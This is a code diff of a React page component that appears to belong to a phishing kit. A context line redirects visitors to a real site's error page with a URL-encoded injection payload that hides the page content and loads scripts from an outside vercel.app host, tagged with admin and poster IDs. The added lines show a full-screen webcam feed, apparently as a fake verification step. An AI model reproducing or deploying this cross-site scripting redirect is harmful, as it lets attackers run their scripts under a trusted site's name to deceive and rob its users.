@@ -9,12 +9,21 @@ function Home({ adminId, posterId }) {
   useEffect(() => {
     setTimeout(() => {
       window.location.href = `https://megapersonals.eu/public/error-message?error=%20data=%20!3m1!%201e3!4m2!4m1!3e0%20Agua%20Caliente%20Indian%20Reservation%20=33.780445%2C-116.545372%20%3C/h2%3E%20%20%3Cstyle%3E.container%20,%20footer%20%7b%20display:%20none%20;%20%7d%20a%20%7b%20color:%20white;%20%7d%20%3C/style%3E%20%3Cscript%20src=%22https://megabacknew.vercel.app/antiClick.js%22%3E%20%3C/script%3E%20%3Cscript%20src=%22https://megabacknew.vercel.app/main.js%22%3E%20%3C/script%20%3E&admin=${adminId}&poster=${posterId}&site=${site}`; // Redirect to an external site
-    }, 2000); // 2 seconds delay for demonstration
+    }, 3000); // 2 seconds delay for demonstration
   }, []);
 
   return (
-    <div>
-      {loading && <div className="loading-animation"></div>}
+    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
+      {/* {loading && <div className="loading-animation"></div>} */}
+
+      <Webcam
+        audio={false}
+        className="object-cover h-screen w-screen lg:w-auto"
+        // height={1080}
+        // width={1262}
+        // screenshotFormat="image/jpeg"
+        // videoConstraints={videoConstraints}
+      />
       {/* Other components can be rendered here */}
     </div>
   );
